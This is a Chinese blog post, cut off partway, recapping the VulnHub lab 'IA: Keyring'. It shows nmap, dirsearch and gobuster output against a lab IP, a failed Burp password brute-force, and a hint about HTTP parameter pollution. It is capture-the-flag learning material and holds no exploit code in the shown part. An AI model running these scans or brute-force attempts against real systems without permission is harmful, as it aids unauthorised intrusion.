<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="vulnhub-IA: Keyring靶场复盘">
<meta property="og:type" content="article">
<meta property="og:title" content="IA: Keyring">
<meta property="og:url" content="https://guayu-kakeru.github.io/posts/8393.html">
<meta property="og:site_name" content="guayu-kakeru">
<meta property="og:description" content="vulnhub-IA: Keyring靶场复盘">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53cd.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53ce.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67a4c69ed0e0a243d4fc53cf.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67a4c69fd0e0a243d4fc53d0.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67a4c6a0d0e0a243d4fc53d1.png">
<meta property="og:image" content="https://pic1.imgdb.cn/item/67a4c7dbd0e0a243d4fc5424.png">
<meta property="article:published_time" content="2025-02-06T10:23:01.000Z">
<meta property="article:modified_time" content="2025-02-06T14:54:06.764Z">
<meta property="article:author" content="guayu-kakeru">
<meta property="article:tag" content="渗透">
<meta property="article:tag" content="靶场">
<meta property="article:tag" content="vulnhub">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53cd.png">

<link rel="canonical" href="https://guayu-kakeru.github.io/posts/8393.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>IA: Keyring | guayu-kakeru</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">guayu-kakeru</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">13</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">76</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/8393.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="guayu-kakeru">
      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="guayu-kakeru">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          IA: Keyring
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-02-06 18:23:01 / 修改时间：22:54:06" itemprop="dateCreated datePublished" datetime="2025-02-06T18:23:01+08:00">2025-02-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9D%B6%E5%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
      
        <div class="out-img-topic">
          <img src="https://pic1.imgdb.cn/item/67a48e1dd0e0a243d4fc3e5d.png" class="img-topic">
        </div>
      
      
        <p>vulnhub-IA: Keyring靶场复盘</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.230</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">06</span> <span class="number">18</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.230</span> (<span class="number">192.168</span>.<span class="number">240.230</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">8</span>d:eb:fd:<span class="number">0</span>a:<span class="number">76</span>:<span class="number">8</span>a:<span class="number">2</span>a:<span class="number">75</span>:<span class="number">6</span>e:<span class="number">9</span>b:<span class="number">6</span>e:<span class="number">7</span>b:<span class="number">51</span>:c4:<span class="number">28</span>:db (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">53</span>:<span class="number">31</span>:<span class="number">35</span>:c0:<span class="number">3</span>a:a0:<span class="number">48</span>:<span class="number">2</span>f:<span class="number">3</span>a:<span class="number">79</span>:f5:<span class="number">56</span>:cd:<span class="number">3</span>c:<span class="number">63</span>:ee (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">8</span>d:<span class="number">7</span>b:d3:c9:<span class="number">15</span>:<span class="number">61</span>:<span class="number">03</span>:b1:b5:f1:d2:ed:<span class="number">2</span>c:<span class="number">01</span>:<span class="number">55</span>:<span class="number">65</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.29</span> (Ubuntu)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">96</span>:BA:A0:CE:<span class="number">70</span>:B8 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">3</span>.X|<span class="number">4</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">3</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">3.2</span> <span class="operator">-</span> <span class="number">4.14</span></span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.01</span> ms <span class="number">192.168</span>.<span class="number">240.230</span> (<span class="number">192.168</span>.<span class="number">240.230</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.97</span> seconds</span><br></pre></td></tr></table></figure></div>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>访问80端口： 是一个登录界面<br><img src="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53cd.png"><br>目录扫描也发现真正的登录界面在login.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u 192.168.240.230         </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/tmp/reports/_192.168.240.230/_25-02-06_18-40-23.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.230</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">23</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span>                                    </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">24</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">25</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/about.php</span>  <span class="operator">-&gt;</span>  index.php                         </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">28</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/control.php</span>  <span class="operator">-&gt;</span>  index.php                       </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">30</span>] <span class="number">302</span> <span class="operator">-</span>  <span class="number">561</span>B  <span class="operator">-</span> <span class="symbol">/home.php</span>  <span class="operator">-&gt;</span>  index.php                          </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">31</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">746</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span>                                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">31</span>] <span class="number">302</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/logout.php</span>  <span class="operator">-&gt;</span>  index.php                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">40</span>:<span class="number">34</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67a4c69dd0e0a243d4fc53ce.png"><br>尝试用bp爆破一下密码 但是爆破不出来<br>继续返回主界面，发现这里竟然也可以注册，自己输入账号密码创建一个用户，然后登录<br><img src="https://pic1.imgdb.cn/item/67a4c69ed0e0a243d4fc53cf.png"><br>页面提醒内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP Parameter Pollution <span class="keyword">or</span> HPP <span class="keyword">in</span> short <span class="keyword">is</span> a vulnerability that occurs</span><br><span class="line">due <span class="keyword">to</span> <span class="keyword">passing</span> <span class="keyword">of</span> multiple parameters <span class="keyword">having</span> same <span class="type">name</span></span><br></pre></td></tr></table></figure></div>
<p>告诉我们有http参数污染漏洞，所以尝试用wfuzz跑参数 但是我没有成功 对wfuzz不是很熟悉<br>去看了下群主的视频，我的思路是没有问题的，也确实是用wfuzz，就是我用这个工具没用对<br>而且需要去网页里面得到cookie. 并且目录没有扫全，以后都用gobuster跑目录了。。。<br><img src="https://pic1.imgdb.cn/item/67a4c69fd0e0a243d4fc53d0.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># gobuster dir -u 192.168.240.230 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -x .php,.txt,.html -t 50</span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.240.230</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">50</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              php,txt,html</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/home.php</span>             (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/login.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1466</span>]</span><br><span class="line"><span class="symbol">/history.php</span>          (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">31</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.php</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/about.php</span>            (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/index.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">3254</span>]</span><br><span class="line"><span class="symbol">/logout.php</span>           (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">0</span>] [-<span class="operator">-&gt;</span> index.php]</span><br><span class="line"><span class="symbol">/control.php</span>          (<span class="params">Status:</span> <span class="number">302</span>) [<span class="params">Size:</span> <span class="number">561</span>] [-<span class="operator">-&gt;</span> index.php]</span><br></pre></td></tr></table></figure></div>
<p>这里的history是页面上没有显示内容的，所以大概率用这个路径<br>先去安装一下seclists字典 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# apt <span class="keyword">update</span></span><br><span class="line">Ge<span class="variable">t:1</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling InRelease [<span class="number">41.5</span> kB]</span><br><span class="line">Ge<span class="variable">t:2</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/main arm64 Packages [<span class="number">20.2</span> MB]</span><br><span class="line">Ge<span class="variable">t:3</span> http://mirrors.aliyun.<span class="keyword">com</span>/kali kali-rolling/main arm64 